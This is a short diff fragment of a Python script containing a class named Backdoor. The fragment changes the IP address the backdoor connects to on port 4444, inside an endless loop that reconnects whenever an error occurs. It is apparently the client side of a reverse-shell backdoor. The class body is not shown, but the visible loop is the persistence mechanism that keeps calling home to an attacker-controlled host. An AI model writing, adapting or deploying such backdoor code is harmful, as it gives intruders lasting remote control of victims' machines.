@@ -166,7 +166,7 @@ class Backdoor:
             
 while True:
     try:
-        mybackdoor = Backdoor("192.168.245.133", 4444)
+        mybackdoor = Backdoor("169.254.0.1", 4444)
         mybackdoor.run()
     except:
         continue
